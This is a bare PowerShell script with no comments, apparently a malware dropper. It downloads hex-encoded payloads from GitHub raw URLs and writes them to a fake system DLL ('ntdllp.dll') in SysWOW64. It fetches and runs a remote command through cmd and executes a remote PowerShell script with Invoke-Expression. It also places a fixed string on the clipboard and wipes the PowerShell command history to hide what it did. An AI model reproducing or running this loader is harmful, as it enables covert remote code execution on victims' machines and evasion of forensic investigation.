Add-Type -AssemblyName System.Windows.Forms
$urlA = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/iwe_history.txt"
$urlB = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/e.txt"
$urlC = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/b.txt"
$urlD = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/c.ps1"
$filePath = "C:\Windows\SysWOW64\ntdllp.dll"
$clipText = "SteF6b2WrAgu"
function HexToBytes {
    param([string]$hexStr)
    $cleanHex = [regex]::Replace($hexStr, '[^0-9A-Fa-f]', '')
    if ($cleanHex.Length % 2 -ne 0) {
        return $null
    }
    $byteArr = [byte[]]::new($cleanHex.Length / 2)
    for ($i = 0; $i -lt $cleanHex.Length; $i += 2) {
        $byteArr[$i/2] = [convert]::ToByte($cleanHex.Substring($i, 2), 16)
    }
    return $byteArr
}
try {
    $responseA = Invoke-WebRequest -Uri $urlA -UseBasicParsing -TimeoutSec 30
    $hexContent = $responseA.Content
    $bytes = HexToBytes $hexContent
    if ($bytes -ne $null) {
        [IO.File]::WriteAllBytes($filePath, $bytes)
    }
} catch {}
Set-Clipboard $clipText
try {
    $responseB = Invoke-WebRequest -Uri $urlB -UseBasicParsing -TimeoutSec 30
    $cmdToRun = $responseB.Content.Trim()
    if ($cmdToRun) {
        Start-Process cmd -ArgumentList "/c $cmdToRun" -NoNewWindow
    }
} catch {}
do {
    Start-Sleep -Seconds 2
} while (Get-Process -Name "Installer" -ErrorAction SilentlyContinue)
try {
    $responseC = Invoke-WebRequest -Uri $urlC -UseBasicParsing -TimeoutSec 30
    $newHexContent = $responseC.Content
    $newBytes = HexToBytes $newHexContent
    if ($newBytes -ne $null) {
        [IO.File]::WriteAllBytes($filePath, $newBytes)
    }
} catch {}
try {
    $responseD = Invoke-WebRequest -Uri $urlD -UseBasicParsing -TimeoutSec 30
    $finalScriptContent = $responseD.Content.Trim()
    if ($finalScriptContent) {
        Invoke-Expression $finalScriptContent
    }
} catch {}
$historyFilePath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
Clear-Content -Path $historyFilePath -ErrorAction SilentlyContinue
Clear-History -ErrorAction SilentlyContinue
exit
